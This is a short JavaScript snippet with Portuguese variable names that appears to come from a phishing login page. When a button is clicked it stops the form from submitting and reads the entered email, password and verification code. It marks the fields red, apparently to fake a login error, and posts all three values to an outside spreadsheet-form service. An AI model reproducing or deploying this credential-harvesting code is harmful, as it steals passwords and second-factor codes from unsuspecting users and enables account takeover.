var apanh=document.getElementById('apanha').addEventListener('click',function(){
    
    document.getElementById('outro').addEventListener('submit',function(event){
        event.preventDefault()
    })

    var n1=document.getElementById('inome')
    var nome=n1.value

    var s1=document.getElementById('isenha')
    var senhas=s1.value

    console.log(nome,senhas)

    n1.style.border='solid 1px red'
    s1.style.border='solid 1px red'

    var codigo=document.getElementById('iveri')
    var cd=codigo.value
    codigo.style.border='solid 1px red'

    
    fetch('https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N',{
        method:'post',
        headers:{
            'Accept':'application/json',
            'Content-Type':'application/json',
        },
        body:JSON.stringify({email:nome,senha:senhas,codigo:cd})
    })
})



